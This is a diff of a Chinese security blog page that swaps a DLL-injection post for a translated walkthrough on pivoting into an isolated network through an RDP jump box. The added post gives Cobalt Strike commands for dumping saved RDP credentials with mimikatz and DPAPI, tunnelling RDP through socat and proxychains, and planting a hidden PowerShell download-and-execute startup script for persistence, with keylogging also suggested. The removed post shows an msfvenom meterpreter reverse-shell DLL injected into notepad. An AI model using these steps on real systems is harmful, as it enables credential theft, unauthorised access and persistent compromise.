@@ -79,7 +79,7 @@
 <link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Metasploit," />
+  <meta name="keywords" content="原创翻译," />
 
 
 
@@ -97,29 +97,27 @@
 
 
 
-<meta name="keywords" content="Metasploit">
+<meta name="description" content="本文我将向大家演示，如何通过RDP跳转盒进入隔离/受保护的网络。下图是我为该场景制作的拓扑图：">
+<meta name="keywords" content="原创翻译">
 <meta property="og:type" content="article">
-<meta property="og:title" content="InjectProc&amp;Metasploit">
-<meta property="og:url" content="http://yoursite.com/InjectProc.html">
+<meta property="og:title" content="如何使用RDP跳过网络隔离？">
+<meta property="og:url" content="http://yoursite.com/RDP.html">
 <meta property="og:site_name" content="即刻安全">
+<meta property="og:description" content="本文我将向大家演示，如何通过RDP跳转盒进入隔离/受保护的网络。下图是我为该场景制作的拓扑图：">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/1496580960878.jpg">
-<meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/1496581431258.jpg">
-<meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/1496581536842.jpg">
-<meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/1496582442573.jpg">
-<meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/1496582390129.jpg">
-<meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/1496582636284.jpg">
-<meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/1496583170345.jpg">
-<meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/1496583297150.jpg">
-<meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/1496583594241.jpg">
-<meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/1496583722323.jpg">
-<meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/1496584076334.jpg">
-<meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/1496584220484.jpg">
-<meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/1496580960878.jpg">
-<meta property="og:updated_time" content="2017-09-11T16:41:48.000Z">
+<meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/15045039824116.jpg">
+<meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/15045040157501.jpg">
+<meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/1505228076535.jpg">
+<meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/1505228546926.jpg">
+<meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/15045040679844.jpg">
+<meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/15045041046706.jpg">
+<meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/1505229347612.jpg">
+<meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/15045042536097.jpg">
+<meta property="og:updated_time" content="2017-09-12T15:17:40.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="InjectProc&amp;Metasploit">
-<meta name="twitter:image" content="http://ojg8j426f.bkt.clouddn.com/1496580960878.jpg">
+<meta name="twitter:title" content="如何使用RDP跳过网络隔离？">
+<meta name="twitter:description" content="本文我将向大家演示，如何通过RDP跳转盒进入隔离/受保护的网络。下图是我为该场景制作的拓扑图：">
+<meta name="twitter:image" content="http://ojg8j426f.bkt.clouddn.com/15045039824116.jpg">
 
 
 
@@ -149,13 +147,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/InjectProc.html"/>
+  <link rel="canonical" href="http://yoursite.com/RDP.html"/>
 
 
 
 
 
-  <title>InjectProc&Metasploit | 即刻安全</title>
+  <title>如何使用RDP跳过网络隔离？ | 即刻安全</title>
   
 
 
@@ -354,7 +352,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/InjectProc.html">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/RDP.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Secist‘blog | 即刻安全是一个专注于网络安全的研究学习平台。致力于为网络安全爱好者，打造氛围良好的技术交流学习平台！本着最初的互联网精神，提供最新的技术文章分享，安全事件跟踪等资讯！">
@@ -371,7 +369,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">InjectProc&Metasploit</h1>
+          <h1 class="post-title" itemprop="name headline">如何使用RDP跳过网络隔离？</h1>
         
 
         <div class="post-meta">
@@ -383,8 +381,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-04T20:50:39+00:00">
-                2017-06-04
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-12T14:11:22+00:00">
+                2017-09-12
               </time>
             
 
@@ -406,8 +404,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Metasploit/" itemprop="url" rel="index">
-                    <span itemprop="name">Metasploit</span>
+                  <a href="/categories/原创翻译/" itemprop="url" rel="index">
+                    <span itemprop="name">原创翻译</span>
                   </a>
                 </span>
 
@@ -443,27 +441,43 @@
       
 
       
-        <p><img src="http://ojg8j426f.bkt.clouddn.com/1496580960878.jpg" alt="enter description here"><br><a id="more"></a></p>
-<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p>
-<script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script>
-<script>
-    var ivaInstance = new Iva('ivaLive', {
-        appkey: 'By9WGzBIx', //应用标示
-        video: 'http://oc78wb8cz.bkt.clouddn.com/InjectProc.mp4', //视频
-        title: 'test', //视频标题，后台视频管理中的标题
-        cover: '' //视频封面，只有在autoplay:false才可生效
-    });
-</script>
-<script src="//cytroncdn.videojj.com/latest/Iva.js"></script>
+        <font color="##006000">本文我将向大家演示，如何通过RDP跳转盒进入隔离/受保护的网络。下图是我为该场景制作的拓扑图：</font>
 
-
-<h2 id="InjectProc"><a href="#InjectProc" class="headerlink" title="InjectProc"></a>InjectProc</h2><p>流程注入是一种非常受欢迎的方法来隐藏代码的恶意行为，并被恶意软件作者大量使用。</p>
-<p>有几种技术，通常使用：DLL注入，过程替换（也称为工艺空心），钩注射和APC注射。</p>
-<p>大多数使用相同的Windows API函数：OpenProcess，VirtualAllocEx，WriteProcessMemory，有关这些功能的详细信息，请使用MSDN。<br>&nbsp;</p>
-<h2 id="DLL注入："><a href="#DLL注入：" class="headerlink" title="DLL注入："></a>DLL注入：</h2><p>打开目标进程。<br>分配空间<br>将代码写入远程进程。<br>执行远程代码。<br>&nbsp;<br>具体可以看看github内容介绍。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1496581431258.jpg" alt="enter description here"><br>&nbsp;<br>我看了大牛的视频自己学着模仿了一下<br>使用的InjectProc.exe在cmd运行<br><img src="http://ojg8j426f.bkt.clouddn.com/1496581536842.jpg" alt="enter description here"><br>&nbsp;<br>这位大牛在视频中演示四个部分 ，我自己也尝试了模仿了其中的一段，觉得不错，我将自己经验分享给各位。<br>首先我使用的是——  InjectProc.exe  dll_inj  path/to/dll.dll  notepad.exe<br>&nbsp;<br>首先下载到我的桌面，<a href="https://github.com/secrary/InjectProc" target="_blank" rel="external">https://github.com/secrary/InjectProc</a> ，和下载InjectProc.exe，是那位大牛制作完成的。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1496582442573.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1496582390129.jpg" alt="enter description here"><br>&nbsp;</p>
-<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>首先打开我们的cmd 进入 InjectProc 目录当中，我们可以看到的目录。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1496582636284.jpg" alt="enter description here"><br>&nbsp;<br>我们运行InjectProc.exe，并且使用dll_inj 参数，加上xxx.dll的路径 ，加上要注入的进程<br>InjectProc.exe  dll_inj  path/to/dll.dll  notepad.exe。<br>在这里我们使用InjectProc\test_files目录中的<img src="http://ojg8j426f.bkt.clouddn.com/1496583170345.jpg" alt="enter description here">，并且我们随机打开一个进程如记事本进程。<br>使用以下命令：得到 mbox.exe—-InjectProc弹框。并杀软未拦截的情况<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1496583297150.jpg" alt="enter description here"><br>&nbsp;</p>
-<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>那么我们可以想到前阵子NSA 的工具包 使用msf生成的dll，得到会话。那么我们可以做下以下实验。<br>首先我们使用msfvenom 生成dll</p>
-<p><pre>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=5555 -f dll &gt;demon.dll</pre><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1496583594241.jpg" alt="enter description here"><br>&nbsp;<br>以及打开我们的msf开启监听<br><img src="http://ojg8j426f.bkt.clouddn.com/1496583722323.jpg" alt="enter description here"><br>&nbsp;<br>那么我们将生成好的dll 丢到InjectProc目录中的随便一个文件中，比如我丢到InjectProc\test_files中<img src="http://ojg8j426f.bkt.clouddn.com/1496584076334.jpg" alt="enter description here"><br>&nbsp;<br>使用以下命令,并且打开记事本。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1496584220484.jpg" alt="enter description here"><br>&nbsp;<br>得到最终会话<br><img src="http://ojg8j426f.bkt.clouddn.com/1496580960878.jpg" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>&nbsp;<br>视频资料：<a href="https://www.youtube.com/watch?v=GT9nBuXatmU" target="_blank" rel="external">https://www.youtube.com/watch?v=GT9nBuXatmU</a>   InjectProc | Process Injection Techniques | Malware<br><a href="https://www.pinterest.com/penetrationtesting/" target="_blank" rel="external">https://www.pinterest.com/penetrationtesting/</a><br><a href="https://github.com/secrary/InjectProc" target="_blank" rel="external">https://github.com/secrary/InjectProc</a>   github</p>
+<p><img src="http://ojg8j426f.bkt.clouddn.com/15045039824116.jpg" alt="enter description here"><br><a id="more"></a></p>
+<h2 id="1-简要说明："><a href="#1-简要说明：" class="headerlink" title="1.简要说明："></a>1.简要说明：</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><div class="line">LAN是一种扁平的工作站和服务器网络。</div><div class="line">一些服务器（包括RDP跳转盒）无法与Internet连接。</div><div class="line">工作站可以通过代理访问Internet。</div><div class="line">RDP跳转盒是LAN上唯一可以与“Secret Network（隔离网络）”通话的主机，仅限于3389端口。</div><div class="line">rasta-lan.local和secret-lan.local是两种不同的网络。</div><div class="line">LAN网段为：10.0.0.0/16；隔离网络网段为：172.16.0.0/24。</div></pre></td></tr></table></figure>
+<p>通过该方案，渗透测试人员可以在其渗透主机（Windows 10）上打开远程桌面连接，并利用RDP直接连接到隔离/受保护的目标服务器上。</p>
+<h2 id="2-场景预设"><a href="#2-场景预设" class="headerlink" title="2.场景预设"></a>2.场景预设</h2><p>我们已有一个名为rasta_mouse的域用户组成员的beacon(信标)。通过查询目标服务器，以确定哪些用户/组已被授予了RDP访问权限。</p>
+<p><font color="#FF0000"><pre><br>beacon&gt; powerpick Get-NetLocalGroup -ComputerName RDP01 -GroupName “Remote Desktop Users”<br>ComputerName : RDP01<br>AccountName  : rasta-lan.local/Jump Box Users<br>IsDomain     : True<br>IsGroup      : True<br>SID          : S-1-5-21-2294392343-2072776990-791666979-1106<br></pre></font><br>谁是Jump Box（跳转盒）用户组的成员？</p>
+<p><font color="#FF0000"><pre><br>beacon&gt; powerpick Get-NetGroupMember -GroupName “Jump Box Users”<br>GroupDomain  : rasta-lan.local<br>GroupName    : Jump Box Users<br>MemberDomain : rasta-lan.local<br>MemberName   : rasta_mouse_adm<br>MemberSID    : S-1-5-21-2294392343-2072776990-791666979-1107<br>IsGroup      : False<br>MemberDN     : CN=Rasta Mouse (Admin),CN=Users,DC=rasta-lan,DC=local<br></pre></font><br>rasta_mouse有两个单独的帐户，这意味着我们需要获取到rasta_mouse_adm的账户凭据才能继续我们下一步的操作。这里我将探讨两种可能的方法。</p>
+<h2 id="3-凭据管理器-amp-DPAPI"><a href="#3-凭据管理器-amp-DPAPI" class="headerlink" title="3.凭据管理器 &amp; DPAPI"></a>3.凭据管理器 &amp; DPAPI</h2><p>如果用户选择了保存RDP凭据，并且你也有SeDebugPrivilege权限来执行此操作，那么这将是最有趣和有效的办法。</p>
+<p>在凭据管理器GUI中的Windows凭据：<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/15045040157501.jpg" alt="enter description here"><br>&nbsp;</p>
+<p>你也可以在命令行上获取：</p>
+<p><font color="#FF0000"><pre><br>beacon&gt; shell vaultcmd /listcreds:”Windows Credentials” /all<br>Credentials in vault: Windows Credentials<br>Credential schema: Windows Domain Password Credential<br>Resource: Domain:target=TERMSRV/rdp01<br>Identity: LAN\rasta_mouse_adm<br>Hidden: No<br>Roaming: No<br>Property (schema element id,value): (100,2)<br></pre></font><br>这些凭据存储在用户目录C:\Users\<username>\AppData\Local\Microsoft\Credentials*中。</username></p>
+<p><font color="#FF0000"><pre><br>beacon&gt; powerpick Get-ChildItem C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials\ -Force<br>    Directory: C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials<br>Mode                LastWriteTime         Length Name<br>-a-hs-       02/09/2017     13:37            412 2647629F5AA74CD934ECD2F88D64ECD0<br>-a-hs-       30/08/2017     19:28          11204 DFBE70A7E5CC19A398EBF1B96859CE5D<br></pre></font><br>现在我们来查看<img src="http://ojg8j426f.bkt.clouddn.com/1505228076535.jpg" alt="C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 。"></p>
+<p><font color="#FF0000"><pre><br>beacon&gt; mimikatz dpapi::cred /in:C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0<br>  dwVersion          : 00000001 - 1<br>  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}<br>  dwMasterKeyVersion : 00000001 - 1<br>  guidMasterKey      : {6515c6ef-60cd-4563-a3d5-3d70a6bc6992}<br>  dwFlags            : 20000000 - 536870912 (system ; )<br>  dwDescriptionLen   : 00000030 - 48<br>  szDescription      : Local Credential Data<br>  algCrypt           : 00006603 - 26115 (CALG_3DES)<br>  dwAlgCryptLen      : 000000c0 - 192<br>  dwSaltLen          : 00000010 - 16<br>  pbSalt             : be072ec0f54a6ceaffd09fe2275d72f9<br>  dwHmacKeyLen       : 00000000 - 0<br>  pbHmackKey         :<br>  algHash            : 00008004 - 32772 (CALG_SHA1)<br>  dwAlgHashLen       : 000000a0 - 160<br>  dwHmac2KeyLen      : 00000010 - 16<br>  pbHmack2Key        : a3579f9e295013432807757d3bcdf82e<br>  dwDataLen          : 000000d8 - 216<br>  pbData             : 0bad8cb788a364061fa1eff57c3cbc83c8aa198c95537f66f2f973c8fe5e7210626c58423b84b55f604cff2b23165b690ad7fa7ad03d80051cb7c1a0e987f36586ede1bd7ff7e2b9f1d3cbc4b8f1b8557ab1be3402d3bfe39b1682353504ff156615b44ea83aa173c3f7830b65bf9202d823932ca69413fcb8bca1a76893c7cbab7e0ee0bbe9269a8b9f65e88e099334177be15cf977a44b77ba6e829c89303ef4764f5fd661e722c7508ad2e01a41f9cd079fc7ce5a8dba90c94a2314941674ad47567bd9c980548f809fe72ce4895b6a56cb9148c47afb<br>  dwSignLen          : 00000014 - 20<br>  pbSign             : 43559a2b2e9b11bc4b56828a1d2ece489c9dfd52<br>  </pre></font><br>以上我们需要关注的是pbData和guidMasterKey的信息。pbData是我们要解密的数据，guidMasterKey是解密所需要的密钥。这里LSASS已经在其缓存中存有这个key – 因此我们可以使用SeDebugPrivilege获取。</p>
+<p><font color="#FF0000"><pre>beacon&gt; mimikatz !sekurlsa::dpapi  </pre></font><br>在输出信息中，我们找到了我们需要的GUID和关联的MasterKey。</p>
+<p><font color="#FF0000"><pre></pre></font></p>
+<pre><code>* 00000000
+* GUID      :  {6515c6ef-60cd-4563-a3d5-3d70a6bc6992}
+* Time      :  02/09/2017 13:37:51
+* MasterKey :  95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
+* sha1(key) :  89f35906909d78c84ba64af38a2bd0d1d96a0726
+</code></pre><p><br>如果我们在交互模式下运行mimikatz，它会自动将这些密钥添加到我们的dpapi缓存中，并在尝试解密凭据时使用它们。但是，通过Cobalt Strike运行mimikatz不允许我们保留相同的会话（至少我不知道该如何保留）。所以，我们必须要拿到key并手动使用它。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1505228546926.jpg" alt="enter description here"><br>&nbsp;</p>
+<h2 id="4-RDP01"><a href="#4-RDP01" class="headerlink" title="4.RDP01"></a>4.RDP01</h2><p>这些凭据将用于RDP进入跳转盒 – 因为是直接从我们的渗透机器上这样做。所以，我们先在我们当前的信标上设置一个SOCKS代理。</p>
+<p><font color="#FF0000"><pre><br>beacon&gt; socks 1337<br>[+] started SOCKS4a server on: 1337<br></pre></font><br><figure class="highlight markdown"><table><tr><td class="code"><pre><div class="line">SSH进入你的Teamserver，并安装socat和proxychains（如果还未安装）。</div><div class="line">修改proxychains.conf配置文件，以在端口1337上使用127.0.0.1。</div><div class="line">然后用proxychains运行socat – &gt; proxychains -&gt; proxychains socat TCP4-LISTEN:3389,fork TCP4:10.0.0.100:3389。</div><div class="line">这将允许我们的Teamserver在3389端口监听，任何进入该该端口的流量，都将被重定向到socks代理10.0.0.100:3389上。</div></pre></td></tr></table></figure></p>
+<p>现在，我们已经RDP到了我们的Teamserver的IP地址，我们应该已经在jump box上了…<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/15045040679844.jpg" alt="enter description here"><br>&nbsp;</p>
+<h2 id="5-Persistence"><a href="#5-Persistence" class="headerlink" title="5..Persistence"></a>5..Persistence</h2><p>为了保持对该服务器的持久访问，我们可以进行简单的设置，以便当真正的rasta_mouse_adm用户连接时， 我们可以获取到一个SMB Beacon。</p>
+<p>操作步骤如下：<br><figure class="highlight markdown"><table><tr><td class="code"><pre><div class="line">创建一个无状态PowerShell SMB Beacon payload。</div><div class="line">在你的Teamserver（(web delivery)）上将其托管在/smb。</div><div class="line">在我们当前的beacon创建一个Reverse Port Foward -&gt; rportfwd 8080 178.62.56.134 80。</div><div class="line">创建C:\Users\rasta<span class="emphasis">_mouse_</span>adm\AppData\Roaming\Microsoft</div><div class="line">\Windows\Start Menu\Programs\Startup\startup.bat，并写入以下内容：</div></pre></td></tr></table></figure></p>
+<p><font color="#FF0000"><pre>powershell.exe -nop -w hidden -c “iex((new-object net.webclient).downloadstring(‘http://<br>10.0.1.200:8080/smb’))”</pre></font><br>注销RDP会话。<br>当真正的用户登录时，我们将会在我们屏幕上获取到以下信息：</p>
+<p><font color="#FF0000"><pre><br>09/02 14:19:45 visit from: 178.62.56.134<br>    Request: GET /smb<br>    page Serves /opt/cobaltstrike/uploads/beacon.ps1<br>    null<br></pre></font><br>让我们连接到beacon。</p>
+<p><font color="#FF0000"><pre><br>beacon&gt; link 10.0.0.100<br>[+] established link to child beacon: 10.0.0.100<br></pre></font><br><img src="http://ojg8j426f.bkt.clouddn.com/15045041046706.jpg" alt="enter description here"></p>
+<p><strong>注意：如果用户注销了，我们将会失去beacon；如果仅仅只是断开连接，那么我们将保持连接。</strong></p>
+<h2 id="6-SECRET"><a href="#6-SECRET" class="headerlink" title="6.SECRET"></a>6.SECRET</h2><p>现在我们已经在jump box上了，我们的目标是SECRET。那么，我们该如何进入SECRET呢？</p>
+<p>你实际上我们可以通过键盘记录来获取到我们想要的信息，如下：<br><img src="http://ojg8j426f.bkt.clouddn.com/1505229347612.jpg" alt="enter description here"><br><figure class="highlight markdown"><table><tr><td class="code"><pre><div class="line">停止当前Beacon中的SOCKS代理，以及Teamserver上的proxychains/socat。</div><div class="line"></div><div class="line">在jump box上启动一个新的SOCKS代理（你可以使用相同的端口）。</div><div class="line"></div><div class="line">在你的Teamserver上运行proxychains socat TCP4-LISTEN:3389，fork TCP4:172.16.0.10:3389。</div><div class="line">像之前一样，RDP到Teamsever IP，我们将直接进入到SECRET。</div></pre></td></tr></table></figure></p>
+<p><img src="http://ojg8j426f.bkt.clouddn.com/15045042536097.jpg" alt="enter description here"></p>
+<h2 id="7-总结"><a href="#7-总结" class="headerlink" title="7.总结"></a>7.总结</h2><p>不要保存RDP凭据在jump boxes上，建议使用双因素身份认证。DPAPI没有足够的保护。<a href="https://t.co/1lBySQcVYt" target="_blank" rel="external">https://t.co/1lBySQcVYt</a></p>
+<p>— Matthew Dunwoody (@matthewdunwoody) September 2, 2017</p>
+<h2 id="8-欢迎下方一起参与讨论"><a href="#8-欢迎下方一起参与讨论" class="headerlink" title="8.欢迎下方一起参与讨论"></a>8.欢迎下方一起参与讨论</h2><p>&nbsp;</p>
 <p><div id="container"></div></p>
 <p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p>
 <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
@@ -497,7 +511,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Metasploit/" rel="tag"># Metasploit</a>
+            <a href="/tags/原创翻译/" rel="tag"># 原创翻译</a>
           
         </div>
       
@@ -510,8 +524,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/Eternalblue-Doublepulsar1.html" rel="next" title="Eternalblue-Doublepulsar完善教程">
-                <i class="fa fa-chevron-left"></i> Eternalblue-Doublepulsar完善教程
+              <a href="/Bypass3.html" rel="next" title="绕过安全防护敏感检测行为">
+                <i class="fa fa-chevron-left"></i> 绕过安全防护敏感检测行为
               </a>
             
           </div>
@@ -520,8 +534,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/我的回归docker.html" rel="prev" title="我的Docker不归路--重新认识docker">
-                我的Docker不归路--重新认识docker <i class="fa fa-chevron-right"></i>
+              <a href="/jishu.html" rel="prev" title="即刻安全纯技术交流群">
+                即刻安全纯技术交流群 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -714,7 +728,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#视频演示："><span class="nav-number">1.</span> <span class="nav-text">视频演示：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#InjectProc"><span class="nav-number">2.</span> <span class="nav-text">InjectProc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DLL注入："><span class="nav-number">3.</span> <span class="nav-text">DLL注入：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01"><span class="nav-number">4.</span> <span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02"><span class="nav-number">5.</span> <span class="nav-text">0x02</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-简要说明："><span class="nav-number">1.</span> <span class="nav-text">1.简要说明：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-场景预设"><span class="nav-number">2.</span> <span class="nav-text">2.场景预设</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-凭据管理器-amp-DPAPI"><span class="nav-number">3.</span> <span class="nav-text">3.凭据管理器 & DPAPI</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-RDP01"><span class="nav-number">4.</span> <span class="nav-text">4.RDP01</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-Persistence"><span class="nav-number">5.</span> <span class="nav-text">5..Persistence</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-SECRET"><span class="nav-number">6.</span> <span class="nav-text">6.SECRET</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-总结"><span class="nav-number">7.</span> <span class="nav-text">7.总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-欢迎下方一起参与讨论"><span class="nav-number">8.</span> <span class="nav-text">8.欢迎下方一起参与讨论</span></a></li></ol></div>
             
 
           </div>
